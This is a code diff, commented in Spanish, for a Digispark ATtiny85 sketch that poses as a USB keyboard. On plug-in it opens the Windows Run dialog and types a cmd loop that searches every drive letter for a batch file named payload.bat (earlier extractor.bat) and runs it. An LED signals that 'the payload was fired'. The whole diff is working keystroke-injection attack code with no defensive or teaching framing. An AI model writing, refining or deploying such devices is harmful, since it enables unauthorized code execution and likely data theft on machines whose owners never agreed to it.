@@ -1,18 +1,27 @@
 #include "DigiKeyboard.h"
 
+// LED integrado: Pin 1 para Digispark Modelo A (rev 1/2), Pin 0 para Modelo B
+#define LED_PIN 1
+
 void setup() {
-  // vacío
+  pinMode(LED_PIN, OUTPUT);
 }
 
 void loop() {
-  // Espera inicial para el reconocimiento del hardware
-  DigiKeyboard.delay(2000);
+  // 1. Espera de enumeración con parpadeo del LED (~4 segundos)
+  // Permite que Windows reconozca el ATtiny85 y monte la partición de almacenamiento masivo
+  for (int i = 0; i < 4; i++) {
+    digitalWrite(LED_PIN, HIGH);
+    DigiKeyboard.delay(500);
+    digitalWrite(LED_PIN, LOW);
+    DigiKeyboard.delay(500);
+  }
 
-  // 1. Abrir Ejecutar (Win + R)
+  // 2. Abrir Ejecutar (Win + R)
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(700);
 
-  // 2. Empezar a escribir el comando: cmd /c "for %d in (
+  // 3. Empezar a escribir el comando: cmd /c "for %d in (
   DigiKeyboard.print("cmd ");
   
   // Imprimir la barra '/' -> Shift + 7
@@ -34,10 +43,10 @@ void loop() {
   // Imprimir paréntesis cerrado ')' -> Shift + 9
   DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT); 
 
-  // 3. Continuar con la condición: do if exist %d:/extractor.bat
+  // 4. Continuar con la condición: do if exist %d:/payload.bat
   DigiKeyboard.print(" do if exist %d");
 
-  // Imprimir dos puntos ':' -> Shift + punto (en la mayoría de teclados es keycode 0x37 o KEY_PERIOD)
+  // Imprimir dos puntos ':' -> Shift + punto (keycode 0x37)
   DigiKeyboard.sendKeyStroke(0x37, MOD_SHIFT_LEFT); 
 
   // Imprimir la barra '/' -> Shift + 7
@@ -61,10 +70,12 @@ void loop() {
   // Imprimir comillas finales '"' -> Shift + 2
   DigiKeyboard.sendKeyStroke(KEY_2, MOD_SHIFT_LEFT); 
 
-  // 4. Ejecutar el payload completo
+  // 5. Ejecutar el payload completo
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  // Esperar un momento y asegurar ciclo infinito pasivo
-  DigiKeyboard.delay(5000);
-  for(;;){}
+  // 6. Encender LED fijo: confirmación visual de que el payload fue disparado
+  digitalWrite(LED_PIN, HIGH);
+
+  // Ciclo infinito pasivo para evitar re-ejecución
+  for (;;) {}
 }
